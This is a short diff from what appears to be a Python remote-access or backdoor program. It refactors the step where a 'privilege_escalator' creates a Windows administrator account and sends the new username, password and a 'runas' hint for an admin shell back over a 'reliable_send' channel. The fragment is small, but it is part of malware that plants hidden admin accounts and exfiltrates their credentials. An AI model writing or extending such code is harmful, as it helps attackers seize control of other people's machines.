@@ -355,10 +355,8 @@ SYSTEM:
                 success, username, password, message = privilege_escalator.create_admin_user()
                 
                 if success:
-                    reliable_send(f"SUCCESS: Admin user created")
-                    reliable_send(f"Username: {username}")
-                    reliable_send(f"Password: {password}")
-                    reliable_send(f"Use 'runas /user:{username} cmd' for admin shell")
+                    response = f"SUCCESS: Admin user created\nUsername: {username}\nPassword: {password}\nUse 'runas /user:{username} cmd' for admin shell"
+                    reliable_send(response)
                 else:
                     reliable_send("FAILED: " + message)
                     
